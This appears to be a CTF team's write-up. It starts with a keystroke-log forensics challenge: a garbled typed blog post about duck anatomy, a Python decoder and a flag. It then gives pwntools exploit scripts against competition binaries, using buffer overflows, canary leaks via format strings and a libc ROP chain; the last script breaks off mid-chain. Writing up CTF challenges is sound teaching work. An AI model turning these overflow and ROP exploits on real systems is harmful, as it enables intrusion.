a<DEL>enteer<SPACE>thha<DEL><DEL><DEL>th<DEL><DEL><DEL>thhefla<DEL>ag.coom<RET><RET><RET>bcrf<DEL><DEL>tf{SstSteAlSt0p_s3nd1Ng_me<DEL>3_d<DEL>DuCK_p1cs<DEL>$}<RET><RET>I<SPACE>thhink<SPACE>m<DEL>what<SPACE>mmakkeess<SPACE>it<SPACE>paarticulaarly<SPACE>uuncoomforatble<SPACE>is<SPACE>the<SPACE>jjuxtab<DEL>ppositooo<DEL><DEL>ion<SPACE>t<DEL>betwween<SPACE>the<SPACE>iimmagge<SPACE>wwe<SPACE>haavve<SPACE>oof<SPACE>ducks<SPACE>and<SPACE>thhis<SPACE>peculiar<SPACE>biologiccal<SPACE>faact.<SPACE><SPACE>Dducs<DEL><DEL>cks<SPACE><SPACE>arre<SPACE>ooften<SPACE>associiatted<SPACE>with<SPACE>ppeaceful,,<SPACE>picturesque<SPACE>mmoomentts.<SPACE><SPACE>Yoou<SPACE>e<DEL>ffee<SPACE><DEL>d<SPACE>them<SPACE>brread<SPACE>crumbs<SPACE>iin<SPACE>thhe<SPACE>ppark.<SPACE><SPACE>Yoou<SPACE><SPACE>wwan<DEL><DEL>tch<SPACE>thhem<SPACE>swiim<SPACE>iin<SPACE>ccalm,<SPACE>ssserene<SPACE>pongs.<SPACE>And<SPACE>thhen<SPACE>thheerre's<SPACE>thhis<SPACE>*Ss<DEL>s<DEL><DEL>SPIRAL<SPACE>PENNIIS<SPACE>SITUATIION*<SPACE>lurkiing<SPACE>tthaatjjuust<SPACE>uunndeer<SPACE><SPACE>thhe<SPACE>surfaacce<SPACE><SPACE>(lliterally<SPACE>andd<SPACE>figurativvelly....).<RET><RET>This<SPACE>rrevvelattiion<SPACE>haas<SPACE>caussed<SPACE>m<SPACE><DEL>to<SPACE><DEL><DEL><DEL><DEL>me<SPACE>tto<SPACE>queessttiion<SPACE><SPACE>a<SPACE>lot<SPACE>of<SPACE>thhiggs,<SPACE>Is<SPACE>nne<DEL><DEL>aturre<SPACE>inheerently<SPACE>weird?<SPACE>Arree<SPACE>theerree<SPACE>morre<SPACE>uunssettliinng<SPACE>faactts<SPACE>aboout<SPACE>anm<DEL>imals<SPACE>t<DEL>I<SPACE>ddoon't<SPACE>kknow<SPACE>yt<DEL><DEL>eet-and<SPACE>ddo<SPACE>I<SPACE>event<SPACE><SPACE>*8want*<SPACE>tto<SPACE>kknoow?<SPACE>Ccooulld<SPACE><SPACE>I<SPACE>havve<SPACE>gone<SPACE>my<SPACE>whhole<SPACE>liffe<SPACE>wio<DEL>h<DEL>thoout<SPACE>kknowiingg<SPACE>thhis<SPACE>aaboout<SPACE>dduckks,,<SPACE>and<SPACE>I<SPACE><DEL>woould<SPACE>I<SPACE>be<SPACE>happieer<SPACE>for<SPACE>it?<RET><RET>Inth<DEL><DEL><DEL><SPACE><SPACE>the<SPACE>end,,<SPACE>theerre'ss<SPACE>nno<SPACE>rreal<SPACE>rresolutiion<SPACE>hheerre,,<SPACE>no<SPACE>epiphany<SPACE>thhaat<SPACE>wraps<SPACE>thhiss<SPACE><DEL><SPACE>uunccoomfoortable<SPACE>faact<SPACE>iinto<SPACE>a<SPACE>nneeat<SPACE>littlee<SPACE>bbiw<DEL><DEL><DEL>ow.<SPACE>Ducks<SPACE>havve<SPACE>sppiral-shapedd<SPACE>penisses<SPACE><DEL>,,<SPACE>andd<SPACE>tthaatt'ss<SPACE>jjuusstt<SPACE>how<SPACE>tthee<SPACE>world<SPACE>works.<SPACE>Bbut<SPACE>even<SPACE>aas<SPACE>aI<DEL><DEL>Ii<SPACE>sit<SPACE>heerre<SPACE>wi<DEL><DEL>ritiinng<SPACE>thhis,,<SPACE>with<SPACE>mmmore<SPACE>t<DEL>works<DEL><DEL>dds<SPACE>thhat<DEL>n<SPACE>necessaary<SPACE>oon<SPACE>I<SPACE><DEL><DEL>a<SPACE>uub<DEL><DEL>suubjjeect<SPACE>I<SPACE>nnever<SPACE>iinteer<DEL>nded<SPACE>to<SPACE>delvve<SPACE>iinnto,,<SPACE>I<SPACE>cccaa't<SPACE>c<DEL><DEL>shhake<SPACE>thhe<SPACE>deeliing<SPACE>thhaat<SPACE>soommethiing<SPACE>haas<SPACE>sshifted<SPACE>iin<SPACE>mmy<SPACE>uunndersstandiinngg<SPACE>of<SPACE>the<SPACE>aniimal<SPACE>kiinggs<DEL>doom,,<SPACE>naturre,,<SPACE>aandd<SPACE>liffe.<RET><RET>Sso<SPACE>the<SPACE>next<SPACE>tiime<SPACE>yoou<SPACE>ssee<SPACE>a<SPACE>u<DEL>duck<SPACE>gglidiinng<SPACE>elegantly<SPACE>acrooss<SPACE>a<SPACE>laake,,<SPACE>uus<DEL><DEL>jjuust<SPACE>rremembeer"<SPACE>beneath<SPACE>thhaatt<SPACE>calm<SPACE>exteerior<SPACE>is<SPACE>a<SPACE>corkscrrew<SPACE>of<SPACE>evolutiionary<SPACE>weirdness<SPACE>thhaatt<SPACE>wwill<SPACE>haunt<SPACE>yoou<SPACE>foreveer.<RET>

def process_string(input_str):
    result = []

    i = 0
    while i < len(input_str):
        if input_str[i:i + 5] == "<DEL>":
            # 如果遇到<DEL>，就删除最后一个字符（如果有的话）
            if result:
                result.pop()  # 删除最后一个字符
            i += 5  # 跳过<DEL>
        else:
            result.append(input_str[i])  # 添加当前字符
            i += 1

    return ''.join(result)

# 示例
input_str ="Bblog<SPACE>enttry<SPACE>#216<RET><RET>Ttt<DEL>itle<SPACE>Tthe<SPACE>Sttrn<DEL>ange<SPACE>andd<SPACE>uunssettliinng<SPACE>Rreality<SPACE>of<SPACE>d<DEL><DEL>Ducls<DEL><DEL>ks<SPACE>Spiral-Ssahpe<DEL><DEL><DEL><DEL>a<DEL>haped...<DEL><DEL><DEL><SPACE>Pennnis<DEL><DEL><DEL><DEL><DEL>Ddoonts<DEL><DEL>s<DEL><DEL>ggs?<DEL><DEL><DEL><DEL><DEL><DEL>Ddiicks?<DEL><DEL><DEL><DEL><DEL><DEL><DEL>Ppenises.<RET><RET>Ttheerre<SPACE>aarre<SPACE>soomme<SPACE>faactts<SPACE>yoou<SPACE>stumvl<SPACE><DEL>e<SPACE>uppon<SPACE>iin<SPACE>liffee<SPACE>thaatt<SPACE>lleae<DEL>ve<SPACE>yoou<SPACE>u<DEL>changed<SPACE><DEL>.<SPACE><SPACE>Im<SPACE>nnott<SPACE>tallkiinng<SPACE>aboout<SPACE>ggrand<SPACE>rrevvelatiions<SPACE>like<SPACE>rrealiziinng<SPACE>the<SPACE>mmeeaniinng<SPACE>of<SPACE>existencce<SPACE><DEL><SPACE>bbut<SPACE>ratheerr<SPACE>thoosse<SPACE>little<SPACE>often<SPACE>uunwwanted<SPACE>tidbiitts<SPACE>of<SPACE>kknowledgge<SPACE>of<SPACE><DEL><DEL><DEL>thhaat<SPACE>o<DEL>soommehow<SPACE>mannagge<SPACE>tto<SPACE>woork<SPACE><DEL><DEL>m<SPACE>thheir<SPACE><SPACE>wa<DEL><DEL>wwa<DEL><DEL><DEL>wway<SPACE>iinto<SPACE>yoour<SPACE>brraiin<SPACE>andd<SPACE>stay<SPACE>thheerre.<SPACE><SPACE>Forever.....<SPACE><SPACE>Ffor<SPACE>me<SPACE>oonne<SPACE>of<SPACE>thosss<SPACE>factts<SPACE>is<SPACE>thhis<SPACE>ducs<DEL>ks<SPACE>hhavvee<SPACE>sppiral-shaped<SPACE>ppenniess<DEL><DEL>ees.<RET><RET>o<DEL>Now<SPACE>beforree<SPACE>yoou<SPACE>click<SPACE>aaway<SPACE>thhinnkiingg<SPACE>tthhiss<SPACE>is<SPACE>soome<SPACE>sort<SPACE>oof<SPACE>absurd<SPACE>prank<SPACE>or<SPACE>ooutlandish<SPACE>clickbait-llet<SPACE>me<SPACE>aassuue<SPACE>y<DEL><DEL><DEL>rre<SPACE>yooooo<DEL><DEL>u<SPACE>tthhiis<SPACE>iis<SPACE>rreal.<SPACE>**t<DEL><DEL>Ttoo**<SPACE>rreal<SPACE>if<SPACE>I<SPACE>may<SPACE>ssay.<SPACE><SPACE>Dducks<SPACE><DEL><SPACE>thosse<SPACE>quait<DEL>nnt<SPACE>i<DEL>little<SPACE>crreeaturres<SPACE>thhaatt<SPACE>waaddle<SPACE>by<SPACE>pondds<SPACE><SPACE>and<SPACE>quacck<SPACE>at<SPACE>ppaasseersby<SPACE>hhavvee<SPACE>genitalia<SPACE>thhaatt<SPACE>ccorkscrrew<SPACE>iin<SPACE>wway<SPACE>I<SPACE>nneverr<SPACE>tthoouuggh<SPACE><DEL><DEL>t<SPACE>ppoossible<DEL><DEL>e<DEL>lle<SPACE>oor<SPACE>neccessaary.<SPACE>Tthe<SPACE>firsst<SPACE>tiime<SPACE>I<SPACE>leearned<SPACE>aaboout<SPACE>thhiss<SPACE><DEL><SPACE>my<SPACE>iimmediatte<SPACE>rrespponnsse<SPACE>waas<SPACE><SPACE>a<SPACE>bewilderredd<SPACE>whhy:W<DEL>whhy:<DEL>?:<SPACE>followed<SPACE>bby<SPACE>a<SPACE>slow<SPACE>crreepiing<SPACE>discomfoort<SPACE>thhaatt<SPACE>I<SPACE>havb<DEL>nt<SPACE>bbeeen<SPACE>able<SPACE>tto<SPACE>shaarke<SPACE>of<DEL><DEL><DEL><DEL><DEL><DEL><DEL>le<SPACE>of<DEL><DEL><DEL><DEL><DEL>ke<SPACE>off<SPACE>siincce.<RET><RET>I<SPACE>supposse<SPACE>thhe<SPACE>first<SPACE>queesstiion<SPACE><SPACE>wwe<SPACE>shoould<SPACE>all<SPACE><SPACE>aask<SPACE>is<SPACE>:How<SPACE>did<SPACE>I<SPACE>evven<SPACE>ccoome<SPACE>across<SPACE>thhiis<SPACE>iinfoormattiion?:<SPACE><SPACE>Wweell<SPACE>Ll<DEL>likke<SPACE>all<SPACE><SPACE>e<DEL>uunexpectted<SPACE>joournets<SPACE><DEL><DEL><DEL><DEL><DEL>yys<SPACE>I<SPACE><DEL>i<DEL><DEL><DEL>it<SPACE>m<DEL>behan<SPACE>n<DEL>i<DEL><DEL><DEL><DEL><DEL><DEL>gan<SPACE>iinnocently<SPACE>enoouggh.<SPACE>I<SPACE>waas<SPACE>ddeep<SPACE>iinto<SPACE>an<SPACE>iinnteerneet<SPACE>rrabbit<SPACE>hole<SPACE>oone<SPACE>eveniing<SPACE>startiing<SPACE>witth<SPACE>whollesoomme<SPACE>videos<SPACE>of<SPACE>duuckiin<DEL><DEL>liin<DEL><DEL>gs<SPACE>lleearniinng<SPACE>tto<SPACE>swiim<DEL>.<SPACE>Tthhat<SPACE>shoould<SPACE>havve<SPACE>been<SPACE>my<SPACE>cue<SPACE>tto<SPACE>sstoop.<SPACE>Butt<SPACE>tthe<SPACE>curiosity<SPACE>maachiine<SPACE>thhatt<SPACE>is<SPACE>thhe<SPACE>iinntteerneet<SPACE>is<SPACE>rrelentless<SPACE>and<SPACE><SPACE>aafteerr<SPACE>cclickiing<SPACE>ffrroom<SPACE>oonne<SPACE>an<DEL><DEL>nnaturre<SPACE>docuumentat<DEL><DEL>rry<SPACE>tto<SPACE>anottheer<SPACE>I<SPACE>su<DEL>tuumblled<SPACE>upun<SPACE>th<DEL><DEL><DEL><DEL><DEL>oon<SPACE>thhe<SPACE>uunnssel<DEL>ttle<DEL>iinng<SPACE>faact<SPACE>thhaat<SPACE>malle<SPACE>ducks<SPACE>SPPEECIFICALLY<SPACE><SPACE>drakees<SPACE><DEL><SPACE>a<DEL>hae<DEL>vve<SPACE>penisses<SPACE>thhaat<SPACE><SPACE>aarree<SPACE>shapedd<SPACE>likke<SPACE>ccorksscrrews.<RET><RET>Aat<SPACE>first<SPACE><SPACE>I<SPACE>didnt<SPACE>believve<SPACE>it.<SPACE><SPACE>I<SPACE>meean<SPACE><DEL><SPACE>whhy<SPACE>soou<DEL><DEL>wo<DEL><DEL><DEL><DEL>woould<SPACE>a<SPACE>duck;a<DEL><DEL>s<SPACE>rreprou<DEL>ductivve<SPACE>oorgan<SPACE>*need(<DEL><DEL>*<SPACE>to<SPACE>rresemble<SPACE>a<DEL>sooomethiing<SPACE>u<DEL>yoou<SPACE>oopen<SPACE>a<SPACE>bottle<SPACE>of<SPACE>of<DEL><DEL>wiine???<SPACE>Iit<SPACE>felt<SPACE>lie<SPACE><DEL><DEL>ke<SPACE>one<SPACE>of<SPACE>thosse<SPACE>qur<DEL>r<DEL>irky<SPACE><DEL><SPACE>uunnes<DEL><DEL>ccessaary<SPACE>adaptattiions<SPACE>thhaatt<SPACE>evolt<DEL>utiion<SPACE>soommetiimmeess<SPACE>ccoomme<SPACE><DEL><DEL>s<SPACE>up<SPACE>with<SPACE>for<SPACE>rreaasoons<SPACE>thaat<SPACE>nno<SPACE>oone<SPACE>rreallly<SPACE>aaskked<SPACE>for.<SPACE>but<SPACE>the<SPACE>kkk<DEL><DEL>mmorre<SPACE>I<SPACE>rread<SPACE><SPACE>(aandd<SPACE>I<SPACE>rreaad<SPACE>alot<DEL><DEL><DEL><DEL><DEL>ALOT)<SPACE>the<SPACE>mmoorree<SPACE>uuncoomforatble<SPACE><SPACE>I<SPACE>became.<SPACE><SPACE>I<SPACE><SPACE>coouldnt<SPACE>stoop<SPACE>a<DEL>iimmagiiniinng<SPACE>it.<RET><RET><CAP><CAP><CAP>m<DEL>mmag<DEL><DEL><DEL><DEL><CAP>magiinge<DEL><DEL>e<SPACE>duckks<SPACE>a<DEL><DEL>wwaaddliing<SPACE>aroound<SPACE>their<SPACE>ssppiral-shaped<SPACE>anatoomy<SPACE>hidden<SPACE>beneeath<SPACE>thosse<SPACE>sseemiinglt<SPACE>iinnocent<SPACE>fath<DEL><DEL>ea<DEL><DEL><DEL><DEL>eeah<DEL>thheer<SPACE><DEL><DEL>s<SPACE>wwaiitiing<SPACE>for<SPACE>t<DEL>jjuusst<SPACE>the<SPACE>right<SPACE>moment<SPACE><SPACE>Its<SPACE>bizarrely<SPACE>elaboratte<SPACE>for<SPACE>a<SPACE>bird<SPACE>coonsideriing<SPACE>thhat<SPACE>mmmosst<SPACE>birdds<SPACE>doont<SPACE>evveen<SPACE>*hhavve8*<SPACE><DEL><DEL>*<SPACE>penises.<SPACE><SPACE>Ttheey<SPACE>makke<SPACE>ddo<SPACE>witth<SPACE>soommethiing<SPACE>caalled<SPACE>a<SPACE>cloacal<SPACE>kiss<SPACE>whheerre<SPACE>thheir<SPACE>rreproduuci<DEL><DEL>tivve<SPACE>oorgans<SPACE>briefly<SPACE>toouch.<SPACE>Dducks<SPACE>n<DEL>oon<SPACE>thhe<SPACE>oothheerr<SPACE>hand<SPACE>went<SPACE>the<SPACE>exttraa<SPACE>miile<SPACE>with<SPACE><SPACE>a<SPACE>coomplex<SPACE>ccooiled<SPACE>maachanism.<SPACE>Iits<SPACE>almosst<SPACE>aas<SPACE>if<SPACE>naturre<SPACE>iin<SPACE>foom<DEL><DEL><DEL><DEL>soome<SPACE>sttrangge<SPACE>g<DEL><DEL>fiit<SPACE>of<SPACE>whiimsy<SPACE>said<SPACE>:Yoou<SPACE>kknow<SPACE>what<SPACE>duckks<SPACE>nees<DEL><DEL>d?<SPACE><SPACE>A<SPACE>penniis<SPACE>thhaatt<SPACE>looks<SPACE>lie<SPACE>a<SPACE><DEL><DEL><DEL><DEL>kke<SPACE>a<SPACE>pei<DEL><DEL><DEL>ieccee<SPACE>off<SPACE>ppat<DEL><DEL>sta.:<RET><RET>Bu<SPACE><DEL>t<SPACE>it<SPACE>doeessnt<SPACE>sstoop<SPACE>thheer.<DEL>e.<SPACE>Oh<SPACE>nno.<SPACE>Aas<SPACE>if<SPACE>thhe<SPACE>spiral<SPACE>shape<SPACE>waasnt<SPACE>uunssettliing<SPACE>enoouuggh<SPACE>thhe<SPACE>whole<SPACE>proccess<SPACE>f<DEL><DEL>of<SPACE>duck<SPACE>rreproductiion<SPACE>is<SPACE>ffraught<SPACE>witth<SPACE>weirdnness<SPACE>aand<SPACE>ffraankly<SPACE>b<DEL><DEL><SPACE>biiole<DEL>viiolencce.<SPACE><SPACE>Ffemale<SPACE>ducs<DEL>ks<SPACE>it<SPACE>turns<SPACE>oouut<SPACE>evolved<SPACE>a<SPACE>coounteer<SPACE><DEL>s<DEL>-sppiral<SPACE>thhaats<SPACE>rigghht-rreproduuctivve<SPACE>ttract<SPACE>to<SPACE>fend<SPACE>off<SPACE>uunwwanted<SPACE>advanccees<SPACE>beecausse<SPACE>yees<SPACE>the<SPACE>u<DEL><DEL>duck<SPACE>world<SPACE>is<SPACE>riffe<SPACE>witth<SPACE>rreproduuctivve<SPACE>coercioon.<SPACE>Tthhaats<SPACE>right-naturre<SPACE>designed<SPACE>an<SPACE>enttri<DEL><DEL>iirre<SPACE>systeem<SPACE>wheerre<SPACE>male<SPACE>aandd<SPACE>ffemale<SPACE>anatomy<SPACE><SPACE>aarre<SPACE>*8att<SPACE>odss<DEL><DEL><DEL>dds(<DEL>*<SPACE>wwith<SPACE><SPACE>each<SPACE>othheer<SPACE>sppiraling<SPACE>wiin<DEL><DEL><DEL>iin<SPACE>oopposite<SPACE>dirrecto<DEL>yiion<DEL><DEL><DEL><DEL>tiions<SPACE>all<SPACE>iin<SPACE>the<SPACE>name<SPACE>of<SPACE><DEL><SPACE>wwel<DEL><DEL>l<DEL>wll<SPACE>survival?<RET><RET>So<SPACE>nnow<SPACE>every<SPACE>tiime<SPACE>I<SPACE>ssee<SPACE>a<SPACE>duck<SPACE>floatiinng<SPACE>graccefully<SPACE>acc<DEL>ross<SPACE>a<SPACE>pong<SPACE>I<SPACE>cccant<SPACE>help<SPACE>bbut<SPACE>feel<SPACE>aa<SPACE>little<SPACE>uuneaasy<SPACE><SPACE>O<DEL><DEL><DEL>.<SPACE><SPACE>On<SPACE>the<SPACE>surfacce<SPACE>thhey<SPACE>sseem<SPACE>calm<SPACE>coomppoossed<SPACE>aandd<SPACE>ppeerffectly<SPACE>haarmlless.<SPACE>But<SPACE>nnow<SPACE>thaat<SPACE>I<SPACE>kknow<SPACE>whhats<SPACE>d<DEL>ggoiing<SPACE>oon<SPACE>beneath<SPACE>thosss<SPACE>ffeaturrees<SPACE>I<SPACE>ccaant<SPACE>uune<DEL><DEL>ssee<SPACE>iit.<SPACE>The<SPACE>ppirals<DEL>-shha<DEL>ped<SPACE>ttrc<DEL>uc<DEL>th<DEL><DEL><DEL><DEL>sppiral-shaped-<DEL><DEL><SPACE>ttruth<SPACE>is<SPACE>alwayss<SPACE>theerre<SPACE><DEL><SPACE>lurkiing<SPACE>iin<SPACE>thhe<SPACE>baacckggroound.<SPACE>and<SPACE>hoonesstly<SPACE>it<SPACE>makees<SPACE>my<SPACE>iinnteeraactiions<SPACE>witth<SPACE><SPACE>ducks<SPACE>aawkwarre.<DEL><DEL>k<DEL><DEL>d.<SPACE>I<SPACE>meean<SPACE>hoow<SPACE>aam<SPACE>I<SPACE>supppoossed<SPACE>tto<SPACE>loook<SPACE>at<SPACE>tthem<SPACE>thhe<SPACE>same<SPACE>wway<SPACE>aa<DEL>gaiin?<RET><RET>enteerthhe<SPACE>fs<DEL><DEL><DEL>fla<DEL>enteer<SPACE>thha<DEL><DEL><DEL>th<DEL><DEL><DEL>thhefla<DEL>ag.coom<RET><RET><RET>bcrf<DEL><DEL>tf{SstSteAlSt0p_s3nd1Ng_me<DEL>3_d<DEL>DuCK_p1cs<DEL>$}<RET><RET>I<SPACE>thhink<SPACE>m<DEL>what<SPACE>mmakkeess<SPACE>it<SPACE>paarticulaarly<SPACE>uuncoomforatble<SPACE>is<SPACE>the<SPACE>jjuxtab<DEL>ppositooo<DEL><DEL>ion<SPACE>t<DEL>betwween<SPACE>the<SPACE>iimmagge<SPACE>wwe<SPACE>haavve<SPACE>oof<SPACE>ducks<SPACE>and<SPACE>thhis<SPACE>peculiar<SPACE>biologiccal<SPACE>faact.<SPACE><SPACE>Dducs<DEL><DEL>cks<SPACE><SPACE>arre<SPACE>ooften<SPACE>associiatted<SPACE>with<SPACE>ppeaceful<SPACE>picturesque<SPACE>mmoomentts.<SPACE><SPACE>Yoou<SPACE>e<DEL>ffee<SPACE><DEL>d<SPACE>them<SPACE>brread<SPACE>crumbs<SPACE>iin<SPACE>thhe<SPACE>ppark.<SPACE><SPACE>Yoou<SPACE><SPACE>wwan<DEL><DEL>tch<SPACE>thhem<SPACE>swiim<SPACE>iin<SPACE>ccalm<SPACE>ssserene<SPACE>pongs.<SPACE>And<SPACE>thhen<SPACE>thheerres<SPACE>thhis<SPACE>*Ss<DEL>s<DEL><DEL>SPIRAL<SPACE>PENNIIS<SPACE>SITUATIION*<SPACE>lurkiing<SPACE>tthaatjjuust<SPACE>uunndeer<SPACE><SPACE>thhe<SPACE>surfaacce<SPACE><SPACE>(lliterally<SPACE>andd<SPACE>figurativvelly....).<RET><RET>This<SPACE>rrevvelattiion<SPACE>haas<SPACE>caussed<SPACE>m<SPACE><DEL>to<SPACE><DEL><DEL><DEL><DEL>me<SPACE>tto<SPACE>queessttiion<SPACE><SPACE>a<SPACE>lot<SPACE>of<SPACE>thhiggs<SPACE>Is<SPACE>nne<DEL><DEL>aturre<SPACE>inheerently<SPACE>weird?<SPACE>Arree<SPACE>theerree<SPACE>morre<SPACE>uunssettliinng<SPACE>faactts<SPACE>aboout<SPACE>anm<DEL>imals<SPACE>t<DEL>I<SPACE>ddoont<SPACE>kknow<SPACE>yt<DEL><DEL>eet-and<SPACE>ddo<SPACE>I<SPACE>event<SPACE><SPACE>*8want*<SPACE>tto<SPACE>kknoow?<SPACE>Ccooulld<SPACE><SPACE>I<SPACE>havve<SPACE>gone<SPACE>my<SPACE>whhole<SPACE>liffe<SPACE>wio<DEL>h<DEL>thoout<SPACE>kknowiingg<SPACE>thhis<SPACE>aaboout<SPACE>dduckks<SPACE>and<SPACE>I<SPACE><DEL>woould<SPACE>I<SPACE>be<SPACE>happieer<SPACE>for<SPACE>it?<RET><RET>Inth<DEL><DEL><DEL><SPACE><SPACE>the<SPACE>end<SPACE>theerress<SPACE>nno<SPACE>rreal<SPACE>rresolutiion<SPACE>hheerre<SPACE>no<SPACE>epiphany<SPACE>thhaat<SPACE>wraps<SPACE>thhiss<SPACE><DEL><SPACE>uunccoomfoortable<SPACE>faact<SPACE>iinto<SPACE>a<SPACE>nneeat<SPACE>littlee<SPACE>bbiw<DEL><DEL><DEL>ow.<SPACE>Ducks<SPACE>havve<SPACE>sppiral-shapedd<SPACE>penisses<SPACE><DEL><SPACE>andd<SPACE>tthaattss<SPACE>jjuusstt<SPACE>how<SPACE>tthee<SPACE>world<SPACE>works.<SPACE>Bbut<SPACE>even<SPACE>aas<SPACE>aI<DEL><DEL>Ii<SPACE>sit<SPACE>heerre<SPACE>wi<DEL><DEL>ritiinng<SPACE>thhis<SPACE>with<SPACE>mmmore<SPACE>t<DEL>works<DEL><DEL>dds<SPACE>thhat<DEL>n<SPACE>necessaary<SPACE>oon<SPACE>I<SPACE><DEL><DEL>a<SPACE>uub<DEL><DEL>suubjjeect<SPACE>I<SPACE>nnever<SPACE>iinteer<DEL>nded<SPACE>to<SPACE>delvve<SPACE>iinnto<SPACE>I<SPACE>cccaat<SPACE>c<DEL><DEL>shhake<SPACE>thhe<SPACE>deeliing<SPACE>thhaat<SPACE>soommethiing<SPACE>haas<SPACE>sshifted<SPACE>iin<SPACE>mmy<SPACE>uunndersstandiinngg<SPACE>of<SPACE>the<SPACE>aniimal<SPACE>kiinggs<DEL>doom<SPACE>naturre<SPACE>aandd<SPACE>liffe.<RET><RET>Sso<SPACE>the<SPACE>next<SPACE>tiime<SPACE>yoou<SPACE>ssee<SPACE>a<SPACE>u<DEL>duck<SPACE>gglidiinng<SPACE>elegantly<SPACE>acrooss<SPACE>a<SPACE>laake<SPACE>uus<DEL><DEL>jjuust<SPACE>rremembeer<SPACE>beneath<SPACE>thhaatt<SPACE>calm<SPACE>exteerior<SPACE>is<SPACE>a<SPACE>corkscrrew<SPACE>of<SPACE>evolutiionary<SPACE>weirdness<SPACE>thhaatt<SPACE>wwill<SPACE>haunt<SPACE>yoou<SPACE>foreveer.<RET>"
output_str = process_string(input_str)
print(output_str)  # 输出: abd

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
`sh`
exec 1>&2
cat flag.txt
```



```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./runway1')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('challs.pwnoh.io', 13401)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
chall = ELF('./runway1', checksec=False)

pd = b'a' * 0x4c
pd += p32(chall.sym['win'])
p.sendline(pd)
p.interactive()
```



```
What's your favorite color? aaaabaaacaaadaaaeaaafaaagaaahaaa
aaaabaaacaaadaaaeaaafaaagaaahaaabctf{1_d0n7_c4r3_571ll_4_m1d_c010r}!?!? Mid af color
```



```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./runway2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('challs.pwnoh.io', 13402)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
chall = ELF('./runway2', checksec=False)

pd = b'x09' * 0x14
pd += p32(0x804A025 + 0x1fdb)
pd += b'aaaa'
pd += p32(0x8049253)

# gdb.attach(p, 'b *0x80492C6nc')
p.sendline(pd)

p.interactive()
```



```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./calc')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('challs.pwnoh.io', 13377)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
chall = ELF('./calc', checksec=False)

# gdb.attach(p, 'b *0x4014F3nc')
p.sendlineafter(b'first operand: ', b'1')
p.sendlineafter(b'the operator: ', b'+')
p.sendlineafter(b'second operand: ', b'pi')
p.sendlineafter(b' like to use: ', b'10014')

canary = u64(p.recvuntil(b'nResult: ')[:-9][-8:])
success("canary = " + hex(canary))

pd = b'0' * 0x28
pd += p64(canary)
pd += p64(chall.bss(0x500))
pd += p64(0x40130D)
p.sendlineafter(b'need to here: ', pd)
p.interactive()
```



```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./runway3')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('challs.pwnoh.io', 13403)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
chall = ELF('./runway3', checksec=False)

# gdb.attach(p, 'b *0x401250nc')

pd = b'%13$p'
p.sendlineafter(b'echo in here?n', pd)
canary = int(p.recvuntil(b'n')[:-1], 16)
pd = b'a' * 0x28
pd += p64(canary)
pd += p64(chall.bss(0x500))
pd += p64(0x4011FC)
p.sendline(pd)

p.interactive()
```



```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./chall')
    libc = ELF('libc.so.6', checksec=False)
else:
    p = remote('challs.pwnoh.io', 13371)
    libc = ELF('libc.so.6', checksec=False)
chall = ELF('./chall', checksec=False)

res = p.recvuntil(b'anything else.n')
res = res[res.find(b"it's at ") + 8:]
res = res[:res.find(b'n')]
addr_system = int(res, 16)
libc.address = addr_system - libc.sym['system']

# gdb.attach(p, 'brva 0x124Enc')
success("system = " + hex(addr_system))
pd = b' ' * 0x20
pd += p64(libc.address + 0x21a000)
pd += p64(libc.search(asm("pop rdi; ret")).__next__())
pd += p64(0)
pd += p64(libc.search(asm("pop rsi; ret")).__next__())
pd += p64(libc.address + 0x21a100)
pd += p64(libc.search(asm("pop rdx ; pop r12 ; ret")).__next__())
pd += p64(0x30)
pd += p64(0)
pd += p64(libc.sym['read'])
pd += p64(libc.search(asm("pop rdi; ret")).__next__())
pd += p64(libc.address + 0x21a100)
pd += p64(libc.search(asm("pop rsi; ret")).__next__())
pd += p64(0)
pd += p64(libc.sym['open'])
pd += p64(libc.search(asm("pop rdi; ret")).__next__())
pd += p64(3)
pd += p64(libc.search(asm("pop rsi; ret")).__next__())
pd += p64(libc.address + 0x21a200)
pd += p64(libc.search(asm("pop rdx ; pop r12 ; ret")).__next__())
pd += p64(0x30)
pd += p64(0)
pd += p64(libc.sym['read'])
pd += p64(libc.search(asm("pop rdi; ret")).__next__())
pd += p64(1)
pd += p64(libc.search(asm("pop rsi; ret")).__next__())
